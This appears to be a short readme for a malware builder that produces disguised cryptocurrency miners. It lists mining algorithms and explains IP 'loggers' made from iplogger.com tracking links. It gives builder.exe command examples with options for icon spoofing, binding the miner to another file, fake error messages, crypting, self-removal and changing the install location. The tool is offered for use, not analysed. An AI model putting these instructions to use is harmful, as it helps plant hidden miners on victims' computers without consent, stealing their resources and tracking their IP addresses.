Algo - can be left blank. It will default on Monero autodetect.
cryptonight            - Autodetect, working on Monero
cryptonight/0          - Original\old
cryptonight/1          - v7
cryptonight/2 	       - CryptoNight variant 2. (v8)
cryptonight/xtl        - Stellite (XTL).
cryptonight/msr        - Masari (MSR), (cryptonight-fast)
cryptonight/xao        - Alloy (XAO)
cryptonight/rto        - Arto (RTO)
cryptonight/half       - "half"
cryptonight/gpu        - CryptoNight-GPU (RYO).
cryptonight/wow        - CryptoNightR (Wownero).
cryptonight/r 	       - CryptoNightR (Monero variant 4).
cryptonight/rwz        - CryptoNight (Graft).
cryptonight/zls        - cn/zls (Zelerius).
cryptonight/double     - cn/double (X-CASH).
cryptonight-lite       - Autodetect ��� Aeon.
cryptonight-lite/0     - Original\old CryptoNight-Lite.
cryptonight-lite/1     - aeon7
cryptonight-lite/ipbc  - "ipbc"
cryptonight-heavy      - Ryo and Loki
cryptonight-heavy/xhv  - "xhv" Haven Protocol
cryptonight-heavy/tube - "tube" BitTube (TUBE)
cryptonight-pico/trtl  - "trtl" TurtleCoin (TRTL)


Loggers.
We create an "invisible image" on https://iplogger.com/, get the address "https://2no.co/16Sxt7", 
copy "16Sxt7" and paste it into the desired logger.

del.bat - to remove the installed build.

For more experienced users.
In the \pucker\ directory, editing the start.bat, start2.bat, and SystemCheck.xml files can change the installation directory and name.

===================================================================

Works through the console. Open cmd.exe, drag builder.exe into it and write parameters for build build via space.
Example:

builder.exe -algo'' -pool'stratum+tcp://pool.com:3333' -wallet'123' -load'50' -loggerS'' -loggerR'' -loggerW'' -ico'' -glue'' -error'' -worker'' -icrypt'' -sremoval''

or

builder.exe -algo'' -pool'stratum+tcp://pool.com:3333' -wallet'123' -load'50' -loggerS'1dajJD' -loggerR'2dajJD' -loggerW'3dajJD' -ico'name' -glue'name' -error'1' -worker'1' -icrypt'1' -sremoval'1'

